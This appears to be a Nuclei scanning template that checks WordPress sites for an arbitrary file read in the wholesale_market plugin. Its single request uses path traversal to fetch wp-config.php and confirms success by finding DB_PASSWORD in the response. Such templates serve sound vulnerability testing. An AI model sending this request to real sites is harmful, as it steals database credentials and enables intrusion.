id: wordpress-wholesale-market-fileread

info:
  name: wordpress-wholesale-market-fileread
  author: HB
  severity: high
  description: wordpress wholesale_market存在任意文件读取漏洞

http:
  - raw: 
    - | 
      GET /wp-admin/admin-ajax.php?action=ced_cwsm_csv_import_export_module_download_error_log&tab=ced_cwsm_plugin&section=ced_cwsm_csv_import_export_module&ced_cwsm_log_download=../../../wp-config.php HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
      Accept: */*
      Connection: Keep-Alive

    matchers:
     - type: dsl
       dsl:
        - 'status_code==200 && contains_all(body,"DB_PASSWORD")'